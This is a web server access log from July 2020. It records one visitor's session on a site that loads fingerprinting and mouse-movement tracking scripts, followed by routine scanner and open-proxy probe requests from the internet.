- - [08/Jul/2020:07:35:46 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:49 +0000] "GET /index.php HTTP/1.1" 200 1250 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /css/main.css HTTP/1.1" 200 739 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 599 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 834 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1047 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 304 162 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:36 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1262 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:40 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:43 +0000] "GET /content/computer_security.php HTTP/1.1" 200 1619 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:04:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/computer_security.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:08:10:50 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:08:32:48 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [08/Jul/2020:08:32:48 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [08/Jul/2020:12:21:52 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
- - [08/Jul/2020:12:52:44 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [08/Jul/2020:13:08:03 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [08/Jul/2020:13:08:03 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [08/Jul/2020:15:23:12 +0000] "GET /admin/login.asp HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:17:51:07 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [08/Jul/2020:20:23:26 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:20:42:06 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:20:43:49 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:20:43:50 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [08/Jul/2020:21:09:36 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [09/Jul/2020:00:21:45 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [09/Jul/2020:00:40:32 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [09/Jul/2020:00:40:32 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [09/Jul/2020:00:52:45 +0000] "GET / HTTP/1.1" 200 2387 "-" - "-"
- - [09/Jul/2020:00:52:45 +0000] "GET / HTTP/1.1" 200 1253 "-" - "Mozilla/5.0 zgrab/0.x"
- - [09/Jul/2020:05:39:03 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [09/Jul/2020:05:39:24 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
